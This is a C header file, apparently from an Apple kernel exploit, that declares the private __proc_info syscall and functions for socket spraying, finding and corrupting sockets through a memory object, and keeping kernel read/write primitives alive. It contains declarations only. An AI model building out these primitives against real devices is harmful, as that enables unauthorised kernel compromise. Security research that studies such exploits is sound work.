#ifndef socket_helpers_h
#define socket_helpers_h

#include "common.h"

#define PROC_INFO_CALL_PIDFILEPORTINFO 0x6
#define PROC_PIDFILEPORTSOCKETINFO 0x3
extern int __proc_info(int callnum, int pid, int flavor, uint64_t arg, void* buffer, int buffer_size);

void krw_sockets_leak_forever(void);
uint64_t spray_socket(void);
void sockets_release(void);
kern_return_t find_and_corrupt_socket(mach_port_t memory_object, mach_vm_offset_t seeking_offset, uint8_t* read_buffer, uint8_t* write_buffer, uint64_t target_inp_gencnt_list[MAX_SOCKETS_COUNT],
                                      size_t* target_inp_gencnt_count, bool do_read);

#endif /* socket_helpers_h */
